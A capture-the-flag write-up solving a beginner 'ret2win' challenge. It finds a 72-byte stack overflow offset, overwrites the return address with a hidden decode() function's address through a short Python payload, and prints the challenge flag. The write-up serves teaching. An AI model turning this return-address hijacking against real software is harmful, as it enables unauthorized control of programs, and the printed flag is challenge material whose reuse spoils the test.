# ret2win – Writeup

## Challenge Description

> A vulnerable SECLEAF access terminal was recovered from a decommissioned internal server.
>
> The developers claimed the system was “unbreakable.”
>
> Can you prove otherwise?

---

# Initial Thoughts

The challenge name immediately gave away the general idea.

```txt
ret2win
```

is a very common beginner binary exploitation pattern where:
- a buffer overflow exists
- the return address gets overwritten
- and execution is redirected into a hidden function.

So before even opening the binary, I already expected:
- stack overflow vulnerability
- hidden “win” function
- simple control-flow hijacking.

---

# Looking at the Binary

I first checked the file type:

```bash
file ret2win
```

Then extracted readable strings:

```bash
strings ret2win
```

Some interesting strings immediately stood out:

```txt
Access Granted!
Flag: %s
vuln
decode
```

That was already a strong hint.

The binary clearly contained:
- a vulnerable function (`vuln`)
- a hidden function (`decode`)
- and code that prints the flag.

At this point, the challenge became less about “finding” the flag and more about figuring out how to redirect execution into the hidden function.

---

# Finding the Target Function

Next, I checked the symbols inside the binary:

```bash
nm ret2win
```

This revealed the address of the hidden function:

```txt
0x4011b1
```

So now the goal was simple:

> overwrite the return address and jump to `decode()`.

---

# Testing for a Buffer Overflow

To confirm the overflow, I sent a very long input:

```bash
python3 -c "print('A'*200)" | ./ret2win
```

The program crashed.

That confirmed the binary was vulnerable to a stack-based buffer overflow.

---

# Finding the Offset

After testing different input lengths, I found that the saved return address was overwritten after:

```txt
72 bytes
```

So the payload structure became:

```txt
[72 bytes padding] + [address of decode()]
```

---

# Building the Payload

I used Python to craft the exploit:

```python
import sys
import struct

payload = b"A"*72 + struct.pack("<Q", 0x4011b1)

sys.stdout.buffer.write(payload)
```

Here:
- `b"A"*72` fills the buffer
- `struct.pack("<Q", 0x4011b1)` overwrites RIP with the address of `decode()`.

---

# Exploitation

Running the payload:

```bash
python3 exploit.py | ./ret2win
```

produced:

```txt
Access Granted!
Flag: SecLeaf{sm4sh_th3_st4ck}
```

The exploit successfully redirected execution flow into the hidden function.

---

# What This Challenge Teaches

This challenge is a classic introduction to binary exploitation.

The important idea is:

> instead of injecting new code, we reuse code that already exists inside the binary.

By overflowing the stack and overwriting the saved return address, execution can be redirected anywhere we want.
